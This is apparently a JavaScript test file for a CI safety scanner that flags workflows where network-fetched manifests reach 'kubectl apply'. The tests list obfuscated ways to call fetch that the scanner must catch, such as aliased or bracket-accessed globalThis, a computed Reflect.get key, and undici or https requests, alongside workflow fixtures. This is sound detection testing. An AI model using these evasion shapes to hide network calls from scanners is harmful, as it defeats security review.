describe('apply-safety-scan: fix 4 — computed fetch shapes beyond a plain globalThis[k] (#1801 round 3)', () => {
  it('RED: optional-chained bracket access `globalThis?.[k]`', () => {
    expect(hasComputedGlobalAccess('globalThis?.[k]("https://x")')).toBe(true);
  });

  it('RED: parenthesized global reference `(globalThis)[k]`', () => {
    expect(hasComputedGlobalAccess('(globalThis)[k]("https://x")')).toBe(true);
  });

  it('RED: an aliased global `g = globalThis; g[k]`', () => {
    expect(hasComputedGlobalAccess('const g = globalThis;\ng[k]("https://x");\n')).toBe(true);
  });

  it('RED: `Reflect.get(globalThis, "fe" + "tch")` — a computed key via Reflect.get', () => {
    expect(hasComputedGlobalAccess('Reflect.get(globalThis, "fe" + "tch")("https://x")')).toBe(
      true,
    );
  });

  it('GREEN: `Reflect.get(globalThis, "fetch")` with a literal key is not computed (the literal "fetch" text is caught elsewhere)', () => {
    expect(hasComputedGlobalAccess('Reflect.get(globalThis, "fetch")')).toBe(false);
  });

  it('GREEN: an alias assigned to a NON-global value is not treated as globalThis', () => {
    expect(hasComputedGlobalAccess('const g = somethingElse;\ng[k]("https://x");\n')).toBe(false);
  });

  it('GREEN: `g = globalThis.foo` (a property access, not a bare alias) does not register "g" as an alias', () => {
    expect(hasComputedGlobalAccess('const g = globalThis.foo;\ng[dynamicKey]();\n')).toBe(false);
  });

  it('RED: `require("undici").request` fetches in-process', () => {
    expect(INTERPRETER_FETCH.test('require("undici").request(opts)')).toBe(true);
  });

  it('RED: `require("node:https").request` fetches in-process', () => {
    expect(INTERPRETER_FETCH.test('require("node:https").request(opts)')).toBe(true);
  });

  it('RED: bare `undici.request(...)` (namespace import) fetches in-process', () => {
    expect(INTERPRETER_FETCH.test("import undici from 'undici';\nundici.request(opts);\n")).toBe(
      true,
    );
  });

  it('RED: `https.request(...)` (was previously missed — only http.request matched)', () => {
    expect(INTERPRETER_FETCH.test("import https from 'node:https';\nhttps.request(opts);\n")).toBe(
      true,
    );
  });

  it('a followed script using the aliased-globalThis shape is caught end-to-end', () => {
    const js = 'const g = globalThis;\ng[name]("https://example.com/x");\n';
    const src = 'node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n';
    const offenders = unsafeApplies(src, { resolveSource: () => js, followScripts: true });
    expect(offenders.length).toBeGreaterThan(0);
  });
});

describe('apply-safety-scan: fix 5 — changesets/action is no longer a blanket allowlist entry (#1801 round 3)', () => {
  it('RED: a literal, apply-shaped publish-script is caught as run text', () => {
    const doc = {
      jobs: {
        releaseJob: {
          steps: [
            { uses: 'changesets/action@v2', with: { 'publish-script': 'kubectl apply -f m.yaml' } },
          ],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc);
    expect(offenders.some((o) => o.startsWith('releaseJob'))).toBe(false); // the step itself has no run: text to flag directly...
    // ...but the gate it opens is provable via a linked fetching sibling:
    const linked = {
      jobs: {
        fetchJob: {
          steps: [
            { run: 'node scripts/lib/probe.mjs\n' },
            { uses: 'actions/upload-artifact@v4', with: { name: 'm', path: 'm.yaml' } },
          ],
        },
        releaseJob: {
          needs: 'fetchJob',
          steps: [
            { uses: 'actions/download-artifact@v4', with: { name: 'm' } },
            { uses: 'changesets/action@v2', with: { 'publish-script': 'kubectl apply -f m.yaml' } },
          ],
        },
      },
    };
    const linkedOffenders = unsafeAppliesInWorkflow(linked, {
      resolveSource: () => `fetch('https://example.com/x');\n`,
      followScripts: true,
    });
    expect(linkedOffenders.some((o) => o.startsWith('fetchJob'))).toBe(true);
  });

  it('RED: a DYNAMIC publish-script expression fails closed (cannot verify what it resolves to)', () => {
    const doc = {
      jobs: {
        fetchJob: {
          steps: [
            { run: 'node scripts/lib/probe.mjs\n' },
            { uses: 'actions/upload-artifact@v4', with: { name: 'm', path: 'm.yaml' } },
          ],
        },
        releaseJob: {
          needs: 'fetchJob',
          steps: [
            { uses: 'actions/download-artifact@v4', with: { name: 'm' } },
            {
              uses: 'changesets/action@v2',
              with: { 'publish-script': '${{ steps.gate.outputs.publish }}' },
            },
          ],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => `fetch('https://example.com/x');\n`,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('fetchJob'))).toBe(true);
  });

  it('GREEN (false-positive control): a LITERAL, non-applying publish-script does not widen the gate', () => {
    const doc = {
      jobs: {
        fetchJob: {
          steps: [
            { run: 'node scripts/lib/probe.mjs\n' },
            { uses: 'actions/upload-artifact@v4', with: { name: 'm', path: 'm.yaml' } },
          ],
        },
        releaseJob: {
          needs: 'fetchJob',
          steps: [
            { uses: 'actions/download-artifact@v4', with: { name: 'm' } },
            { uses: 'changesets/action@v2', with: { 'publish-script': 'npm publish' } },
          ],
        },
      },
    };
    const offenders = unsafeAppliesInWorkflow(doc, {
      resolveSource: () => `fetch('https://example.com/x');\n`,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });
});
